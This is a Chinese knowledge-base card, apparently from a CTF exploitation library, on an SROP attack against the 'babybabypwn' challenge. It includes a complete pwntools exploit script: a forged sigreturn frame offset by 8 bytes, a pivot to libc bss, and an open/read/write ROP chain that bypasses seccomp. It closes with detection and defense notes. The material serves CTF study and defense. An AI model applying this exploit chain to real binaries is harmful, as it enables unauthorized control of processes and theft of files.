---
id: binary-pwn-stack-sigreturn-call-offset8-libc-bss-orw
title: 程序自带 syscall(15) 的 SROP：call 压栈使伪造 frame 前移 8 字节，改 rip/rsp 迁移 libc bss 后 ORW
type: scenario
domain: binary
path: binary/pwn/stack
technique: call-syscall15-frame-offset8-libc-bss-orw
aliases:
- V&N2020 babybabypwn
- syscall(15) SROP
- SigreturnFrame 偏移 8 字节
- call 返回地址占据 frame 首槽
- 无需栈溢出的 SROP
- libc bss 栈迁移 ORW
tags:
- binary
- pwn
- srop
- sigreturn
- seccomp
- orw
- libc-bss
- stack-pivot
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V688
  verified_at: '2026-11-13T16:04:24+08:00'
  notes: 已对照原文与20张图核对：sub_1347 在 read 后 call _syscall(图20)、传参15、call压栈使uc_flags槽为返回地址故发送bytes(frame)[8:](原文exp/图19)、seccomp封execve等(图18)、单帧 rip=read/rsp=bss+0x400 迁移后 libc ROP ORW 与原文exp一致；未验证点：未本机复跑PoC，libc gadget偏移按原文libc
---

## 一句话结论

若程序自身在 `read` 之后直接调用 libc 的 `syscall(15)`（即主动进入 `rt_sigreturn`），则不需要栈溢出：只要 `read` 的栈缓冲区与内核解析 signal frame 的位置重叠，就能伪造 frame 控制全部寄存器。关键细节是 `call syscall` 先把返回地址压栈，占据 frame 起始的 8 字节（`uc_flags` 槽），因此 payload 要从 `bytes(SigreturnFrame())[8:]` 开始摆放；frame 设 `rip=read`、`rsp=libc_bss` 可把栈迁移到 libc bss，再用 libc gadget 完成 open/read/write 读出 flag（seccomp 封掉 execve 时尤其适用）。

## 原理

- **SROP 基础**：Linux 处理信号时由内核在用户栈上保存 `ucontext`（全部寄存器）；handler 返回执行 `rt_sigreturn`（x86-64 系统调用号 15）时，内核完全信任这块用户可写内存并按它恢复寄存器。控制该内存并令 `rax=15` 执行 `syscall`，即可一次性设定全部寄存器。
- **本题形态（无需溢出）**：程序流程为 `puts` 打印标题、`printf("gift: 0x%llx", &puts)` 泄漏 libc 地址、`read(0, buf, 0x100)` 读入 0x100 字节到 264 字节的栈缓冲区（未溢出，canary 完好），随后直接调用 `syscall(15LL)`——即 libc 的 `syscall` 包装函数，第一个参数是 15，内部 `mov rax, rdi; ... ; syscall` 实际执行 `rt_sigreturn`。因此攻击面不是“写坏返回地址”，而是“读入的缓冲区恰好覆盖内核将要解析的 frame”。
- **call 压栈与 8 字节偏移（核心细节）**：`sub_1347` 通过 `call syscall` 进入 libc 包装函数时，`call` 先把返回地址压栈；libc 包装函数不再调整栈就直接 `syscall`，所以 `rt_sigreturn` 执行时 `rsp` 指向这个返回地址。内核按 `rsp` 起解析 frame：偏移 0 的 `uc_flags` 槽实际是 `call` 的返回地址（不受控但无害），攻击者可控的缓冲区从 `rsp+8` 开始。pwntools `SigreturnFrame()` 的第一个 qword 就是 `uc_flags`，所以发送时要丢掉前 8 字节（`bytes(frame)[8:]`），让 frame 的第二个字段（`&uc`）对齐到缓冲区起点。若改成裸 `syscall` 指令触发，则没有这层偏移。
- **PIE/Full RELRO 下的定位**：`printf` 把 `&puts`（libc 中 puts 的地址）打印出来，据此算出 libc base；后续 frame 与 ROP 全部用 libc 的 `read/open/write`、libc gadget 和 libc bss，不依赖 PIE base。
- **第一段 frame 做栈迁移**：设 `rdi=0`、`rsi=libc_bss+0x400`、`rdx=0x200`、`rip=libc_read`、`rsp=libc_bss+0x400`。sigreturn 恢复后执行正常的 `read(0, bss, 0x200)` 函数调用，把第二段 ROP 链读进 libc bss；read 返回时从 `rsp`（已迁移到 bss）弹出第一个 gadget，衔接到 ROP 链。
- **为什么用 libc `read` 而非 syscall 指令**：`read` 是普通函数，参数遵循 System V ABI（`rdi/rsi/rdx`），sigreturn 恢复的寄存器正好满足；其返回地址从新栈（bss）取，天然完成“SROP→ROP”的交接。
- **seccomp 与 ORW**：过滤器杀掉 `mmap/mprotect/socket/connect/bind/listen/clone/fork/execve` 等，但放行 `open/read/write`，所以第二段用 libc gadget 顺序执行 `open("flag")` → `read(3, buf, n)` → `write(1, buf, n)` 读出 flag，不需要 execve。

## 触发条件

- x86-64 ELF；程序在可控 `read` 之后调用 libc `syscall()` 且首参为 15（或在信号处理返回路径上主动执行 `rt_sigreturn`）。
- `read` 缓冲区位于栈上且与 `rt_sigreturn` 解析的 frame 起始位置重叠（本例缓冲区起点正好是 frame 偏移 8）；读入长度足以覆盖一份 frame（约 0xF8 字节）。
- 可泄漏 libc 地址（任意函数指针均可）；存在可写且地址已知的 libc bss 或程序 bss 作为新栈。
- seccomp 未封 `open/read/write/rt_sigreturn`；即使封了 `execve`，ORW 仍可出 flag。
- 不需要栈溢出，canary 可以保持完整；NX/ASLR 均不阻碍。

## 利用步骤

1. checksec 确认 PIE/Full RELRO/canary/NX；用 seccomp-tools dump 确认封禁列表（本题为 mmap/mprotect/socket/connect/bind/listen/clone/fork/execve，其余放行）。
2. 接收 `printf` 泄露的 puts 地址计算 libc base；确定 libc `open/read/write` 地址、`rdi/rsi/rdx` gadget 与 libc bss 落点。
3. 构造第一份 frame：`rdi=0`、`rsi=bss+0x400`、`rdx=0x200`、`rip=read`、`rsp=bss+0x400`；发送 `bytes(frame)[8:]` 覆盖 read 缓冲区（前 8 字节留给 `call` 压入的返回地址）。
4. `rt_sigreturn` 恢复后执行 `read(0, bss, 0x200)`；此时发送第二段 ORW ROP 链，链尾附 `"flag\x00"` 路径字符串。
5. read 返回后从 bss 栈顶弹出第一个 gadget，依次执行 `open(flag)`、`read(3, buf, 0x100)`、`write(1, buf, 0x100)` 输出 flag。
6. 排错：若未去掉 frame 前 8 字节，`uc_flags` 被返回地址占据导致恢复错位崩溃；若程序用的是裸 `syscall` 指令而非 `call` 包装函数，则不需要偏移。

## PoC

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = process('./pwn')
libc = ELF('./libc.so.6')

io.recvuntil('gift: ')
puts = int(io.recv(14), 16)          # "0x" + 12 位十六进制
libc_base = puts - libc.symbols['puts']

open_addr  = libc_base + libc.symbols['open']
read_addr  = libc_base + libc.symbols['read']
write_addr = libc_base + libc.symbols['write']
rdi_ret = libc_base + 0x21112        # 按目标 libc 调整
rsi_ret = libc_base + 0x202f8
rdx_ret = libc_base + 0x1b92
bss = libc_base + libc.bss()
buf_addr = bss + 0x400

frame = SigreturnFrame()             # 第一段：read(0, bss, 0x200) 并迁移 rsp
frame.rdi = 0
frame.rsi = buf_addr
frame.rdx = 0x200
frame.rsp = buf_addr
frame.rip = read_addr
io.sendafter('Please input magic message: ', bytes(frame)[8:])

flag = buf_addr + 0x98               # 路径字符串在 ROP 链尾部
pl  = p64(rdi_ret) + p64(flag) + p64(rsi_ret) + p64(0) + p64(open_addr)
pl += p64(rdi_ret) + p64(3) + p64(rsi_ret) + p64(bss + 0x200) + p64(rdx_ret) + p64(0x100) + p64(read_addr)
pl += p64(rdi_ret) + p64(1) + p64(rsi_ret) + p64(bss + 0x200) + p64(rdx_ret) + p64(0x100) + p64(write_addr)
pl += b'flag\x00'
io.send(pl)
io.interactive()
```

## 变体与关联

- **触发方式变体**：若程序用裸 `syscall` 指令触发 `rt_sigreturn`（无 `call` 包装），frame 从缓冲区起点摆放，不需要 `[8:]` 偏移；若 `rax=15` 由 `read` 返回值或 `pop rax` gadget 得到，则为常见的溢出型 SROP。
- **迁移目标变体**：可迁移到程序自身 bss（需处理 PIE 泄漏）或 libc bss；也可令 `rip=syscall 指令` + `rsp=下一帧` 串联多份 frame，而不落到普通函数。
- **对照**：单帧 execve 基础形态见 [[binary-pwn-stack-x64-srop-sigreturn-frame-execve]]；BSS 栈迁移三段 SROP ORW 见 [[binary-pwn-stack-short-overflow-bss-pivot-3stage-srop-orw-syscall-wrapper]]（其中还讨论了 frame.rip 指向 libc `syscall` 包装器时的寄存器重排，与本卡的 call 偏移问题是两个不同的坑）；signal handler 覆盖 rt_sigframe 见 [[ctf-pwn-signal-handler-rt-sigframe-srop-orw]]；32 位与 MIPS 变体见 [[binary-pwn-stack-32bit-srop-read-return-sigreturn]]、[[binary-pwn-stack-mips-srop-sigreturn-bss-execve]]。
- **边界**：read 长度不足以覆盖整份 frame、缓冲区与 frame 起点不重叠、无可写已知段做新栈、或 seccomp 同时封 `open/read` 时本链不成立；若程序把 `read` 的缓冲区放在堆上，内核仍从当前 `rsp` 解析 frame，二者不重叠则无法利用。

## 检测与防御

- **检测**：read 之后进程立即执行 `rt_sigreturn`；栈上缓冲区出现 sigcontext 指纹（`cs=0x33`、`rip=read/syscall`、`rsp` 指向 bss）；随后的系统调用序列为 `open→read→write` 且无 execve。
- **防御**：不要主动调用 `syscall(15)`；seccomp 白名单并评估 `rt_sigreturn` 的必要性；避免让可控读缓冲区与 sigreturn frame 在栈上重叠（如把缓冲区换到堆/独立映射）；编译启用 canary/PIE/RELRO 可提高溢出型变体的成本，但对本“非溢出”路径无效。
- **响应**：审计异常 `rt_sigreturn` 的调用上下文（`rsp` 指向缓冲区、frame 中 `rip=read`、`rsp=bss`）以及随后的 ORW 序列。
